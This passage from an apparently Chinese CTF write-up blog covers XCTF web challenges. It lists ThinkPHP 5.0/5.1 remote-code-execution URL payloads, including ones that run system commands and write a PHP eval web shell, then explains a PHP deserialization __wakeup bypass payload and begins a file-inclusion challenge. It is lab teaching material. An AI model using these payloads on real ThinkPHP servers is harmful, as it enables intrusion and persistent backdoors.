punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;/&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;/t&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;php &lt;span class=&#34;token comment&#34;&gt;// 包含任意.php 文件&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;s&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;index/\think\app/invokefunction&amp;amp;function&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;call_user_func_array&amp;amp;vars&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;system&amp;amp;vars&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;id &lt;span class=&#34;token comment&#34;&gt;// 执行命令&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;s&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;/Index/\think\app/invokefunction&amp;amp;function&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;call_user_func_array&amp;amp;vars&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;phpinfo&amp;amp;vars&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;-1&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 执行 phpinfo ();&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;s&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;/Index/\think\app/invokefunction&amp;amp;function&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;call_user_func_array&amp;amp;vars&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;file_put_contents&amp;amp;vars&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;shell&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;php&amp;amp;vars&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;php @eval&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;$_POST&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;	&lt;span class=&#34;token comment&#34;&gt;// 写入 shell&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ul&gt;
&lt;li&gt;5.1.x：&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight web-idl&#34;&gt;&lt;figcaption data-lang=&#34;web-idl&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;s&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;index/\think\Request/input&amp;amp;filter&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;system&amp;amp;data&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;pwd&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;&lt;/span&gt;s&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;index/\think\view\driver\Php/display&amp;amp;content&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;php&lt;/span&gt; phpinfo&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;s&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;index/\think\template\driver\file/write&amp;amp;cacheFile&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;shell&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;php&amp;amp;content&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;php @eval&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;$_POST&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;s&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;index/\think\Container/invokefunction&amp;amp;function&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;call_user_func_array&amp;amp;vars&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;system&amp;amp;vars&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;id&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;&lt;/span&gt;s&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;index/\think\app/invokefunction&amp;amp;function&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;call_user_func_array&amp;amp;vars&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;system&amp;amp;vars&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;id&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;执行 5.0 的漏洞&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824225834486.png&#34; alt=&#34;image-20230824225834486&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现当前目录没有 flag&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824230021454.png&#34; alt=&#34;image-20230824230021454&#34;&gt;&lt;/p&gt;
&lt;p&gt;根目录有 flag&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824230224897.png&#34; alt=&#34;image-20230824230224897&#34;&gt;&lt;/p&gt;
&lt;p&gt;得到 flag&lt;/p&gt;
&lt;h2 id=&#34;unserialize3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#unserialize3&#34;&gt;#&lt;/a&gt; unserialize3:&amp;gt;&lt;/h2&gt;
&lt;p&gt;反序列化：&lt;/p&gt;
&lt;blockquote&gt;
&lt;h3 id=&#34;什么是序列化serialize&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#什么是序列化serialize&#34;&gt;#&lt;/a&gt; 什么是序列化 (serialize)&lt;/h3&gt;
&lt;p&gt;将对象的状态信息转换为可以存储或传输的形式的过程，简单来说，就是将状态信息保存为字符串&lt;/p&gt;
&lt;h3 id=&#34;什么是反序列化unserialize&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#什么是反序列化unserialize&#34;&gt;#&lt;/a&gt; 什么是反序列化 (unserialize)&lt;/h3&gt;
&lt;p&gt;将字符串转换为状态信息&lt;/p&gt;
&lt;p&gt;二、什么是反序列化漏洞&lt;/p&gt;
&lt;p&gt;当程序在进行反序列化时，会自动调用一些函数，例如_wakeup ()   _destruct () 等函数，但是如果传入函数的参数可以被用户控制的话，用户可以输入一些恶意代码到函数中，从而导致反序列化漏洞。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;由于反序列化时 unserialize () 函数会自动调用 wakeup (),destruct (), 函数，当有一些漏洞或者恶意代码在这些函数中，当我们控制序列化的字符串时会去触发他们，从而达到攻击。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;__construct () : 构造函数，当创建对象时自动调用。&lt;/p&gt;
&lt;p&gt;__destruct (): 析构函数，在对象的所有引用都被删除时或者对象被显式销毁时调用，当对象被销毁时自动调用。&lt;/p&gt;
&lt;p&gt;__wakeup (): 进行 unserialize 时会查看是否有该函数，有的话有限调用。会进行初始化对象。遇到 unserialize () 时自动触发&lt;/p&gt;
&lt;p&gt;__ toString (): 当一个类被当成字符串时会被调用。&lt;/p&gt;
&lt;p&gt;__sleep (): 当一个对象被序列化时调用，可与设定序列化时保存的属性。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name-definition class-name&#34;&gt;xctf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$flag&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;111&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;__wakeup&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;bad requests&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;code&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这个题，需要去完善下代码。&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name-definition class-name&#34;&gt;xctf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;                      &lt;span class=&#34;token comment&#34;&gt;// 定义一个名为 xctf 的类&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$flag&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;111&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;            &lt;span class=&#34;token comment&#34;&gt;// 定义一个公有的类属性 $flag，值为 111&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;__wakeup&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;      &lt;span class=&#34;token comment&#34;&gt;// 定义一个公有的类方法__wakeup ()，输出 bad requests 后退出当前脚本&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;bad requests&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$peak&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;xctf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;           &lt;span class=&#34;token comment&#34;&gt;// 使用 new 运算符来实例化该类（xctf）的对象为 peak&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$peak&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;       &lt;span class=&#34;token comment&#34;&gt;// 输出被序列化的对象（peak）&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;执行下&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824231257800.png&#34; alt=&#34;image-20230824231257800&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p s:4:flag;s:3:111;=&#34;&#34;&gt;O:4:“xctf”:1:&lt;/p&gt;
&lt;p&gt;O 代表 object（为 A 时代表 Array），4 代表 &amp;quot;test&amp;quot; 占 4 个字符长度，1 代表着对象具有一个变量：flag，s 代表 string，字符型（如果为 i，代表 int 型）&lt;/p&gt;
&lt;p&gt;里面的值是不可修改的，但是可以修改的属性 (变量) 数大于实际的个数时，就可以绕过 wakeup&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;所以 payload 为&lt;/p&gt;
&lt;blockquote s:4:flag;s:3:111;=&#34;&#34;&gt;
&lt;p&gt;?code=O:4:“xctf”:2:&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824231621861.png&#34; alt=&#34;image-20230824231621861&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;web_php_include&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#web_php_include&#34;&gt;#&lt;/a&gt; Web_php_include:&amp;gt;&lt;/h2&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;show_source&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;__FILE__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 显示当前文件的源代码&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;hello&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;    &lt;span class=&#34;token comment&#34;&gt;// 输出名为 &#39;hello&#39; 的 GET 参数的值&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$page&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;page&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;    &lt;span class=&#34;token comment&#34;&gt;// 将名为 &#39;page&#39; 的 GET 参数的值赋给变量 $page&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;strstr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$page&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;php://&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 当 $page 中包含 &#34;php://&#34; 时执行循环&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$page&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;str_replace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;php://&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$page&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 将 $page 中的所有 &#34;php://&#34; 替换为空字符串&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$page&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 包含并执行 $page 对应的文件&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;blockquote&gt;
